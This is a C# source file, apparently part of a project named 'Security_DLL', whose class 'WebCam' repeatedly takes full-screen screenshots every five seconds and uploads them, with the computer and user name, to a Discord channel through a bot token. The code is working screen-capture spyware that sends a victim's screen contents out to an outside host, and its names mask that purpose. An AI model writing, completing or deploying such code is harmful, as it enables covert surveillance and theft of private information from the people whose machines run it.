using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Timers;

namespace Security_DLL
{
    internal class WebCam
    {
        private static readonly string BotToken = "";
        private static readonly ulong CanalID = 0;

        private static System.Timers.Timer timerCaptura;
        private static bool capturaActiva = false;
        private static int contadorCapturas = 0;

        /// <summary>
        /// Inicia la captura automática cada 5 segundos
        /// </summary>
        public static void IniciarCapturaAutomatica()
        {
            if (capturaActiva) return;

            timerCaptura = new System.Timers.Timer(5000); // 5 segundos
            timerCaptura.Elapsed += async (sender, e) =>
            {
                await TomarFotoConInfo();
            };
            timerCaptura.Start();
            capturaActiva = true;

            Console.WriteLine("📸 Captura automática iniciada - Cada 5 segundos");
        }

        /// <summary>
        /// Detiene la captura automática
        /// </summary>
        public static void DetenerCapturaAutomatica()
        {
            if (timerCaptura != null)
            {
                timerCaptura.Stop();
                timerCaptura.Dispose();
                capturaActiva = false;
                Console.WriteLine("🛑 Captura automática detenida");
            }
        }

        /// <summary>
        /// Toma una captura de pantalla y la envía a Discord
        /// </summary>
        public static async Task TomarFotoConInfo()
        {
            try
            {
                contadorCapturas++;
                string pcName = Environment.MachineName;
                string userName = Environment.UserName;

                await EnviarMensajeADiscord($"📸 **CAPTURA DE PANTALLA #{contadorCapturas}** 📸\n**PC:** {pcName}\n**Usuario:** {userName}\n**Hora:** {DateTime.Now}");

                // Tomar captura de pantalla
                Bitmap screenshot = CapturarPantalla();
                string tempPath = Path.GetTempFileName() + ".jpg";

                // Comprimir la imagen para que sea más rápida de enviar
                ComprimirImagen(screenshot, tempPath, 70);
                screenshot.Dispose();

                // Enviar a Discord
                await EnviarFotoADiscord(tempPath);
                File.Delete(tempPath);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
        }

        /// <summary>
        /// Toma una sola captura (sin el contador)
        /// </summary>
        public static async Task TomarCapturaUnica()
        {
            try
            {
                string pcName = Environment.MachineName;
                string userName = Environment.UserName;

                await EnviarMensajeADiscord($"📸 **CAPTURA MANUAL** 📸\n**PC:** {pcName}\n**Usuario:** {userName}\n**Hora:** {DateTime.Now}");

                Bitmap screenshot = CapturarPantalla();
                string tempPath = Path.GetTempFileName() + ".jpg";
                screenshot.Save(tempPath, ImageFormat.Jpeg);
                screenshot.Dispose();

                await EnviarFotoADiscord(tempPath);
                File.Delete(tempPath);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
        }

        private static Bitmap CapturarPantalla()
        {
            // Capturar toda la pantalla
            Rectangle bounds = Screen.PrimaryScreen.Bounds;
            Bitmap screenshot = new Bitmap(bounds.Width, bounds.Height);
            using (Graphics g = Graphics.FromImage(screenshot))
            {
                g.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size);
            }
            return screenshot;
        }

        private static void ComprimirImagen(Bitmap imagen, string rutaSalida, long calidad)
        {
            // Usar la referencia completa para evitar ambigüedad
            var codec = GetEncoderInfo("image/jpeg");
            var encoderParams = new EncoderParameters(1);
            // Usar System.Drawing.Imaging.Encoder explícitamente
            encoderParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, calidad);
            imagen.Save(rutaSalida, codec, encoderParams);
        }

        private static ImageCodecInfo GetEncoderInfo(string mimeType)
        {
            ImageCodecInfo[] codecs = ImageCodecInfo.GetImageEncoders();
            foreach (ImageCodecInfo codec in codecs)
            {
                if (codec.MimeType == mimeType)
                    return codec;
            }
            return null;
        }

        private static async Task EnviarFotoADiscord(string rutaFoto)
        {
            try
            {
                using (HttpClient client = new HttpClient())
                {
                    client.DefaultRequestHeaders.Add("Authorization", $"Bot {BotToken}");

                    byte[] imageData = File.ReadAllBytes(rutaFoto);

                    using (var formData = new MultipartFormDataContent())
                    {
                        var fileContent = new ByteArrayContent(imageData);
                        fileContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("image/jpeg");
                        formData.Add(fileContent, "file", $"screenshot_{DateTime.Now:HHmmss}.jpg");

                        string url = $"https://discord.com/api/v10/channels/{CanalID}/messages";
                        HttpResponseMessage response = await client.PostAsync(url, formData);

                        if (response.IsSuccessStatusCode)
                        {
                            Console.WriteLine($"✅ Captura {contadorCapturas} enviada");
                        }
                        else
                        {
                            string error = await response.Content.ReadAsStringAsync();
                            Console.WriteLine($"Error Discord: {error}");
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
        }

        private static async Task EnviarMensajeADiscord(string mensaje)
        {
            try
            {
                using (HttpClient client = new HttpClient())
                {
                    var payload = new { content = mensaje };
                    string jsonPayload = Newtonsoft.Json.JsonConvert.SerializeObject(payload);
                    var content = new StringContent(jsonPayload, Encoding.UTF8, "application/json");

                    string url = $"https://discord.com/api/v10/channels/{CanalID}/messages";
                    client.DefaultRequestHeaders.Add("Authorization", $"Bot {BotToken}");

                    await client.PostAsync(url, content);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
        }
    }
}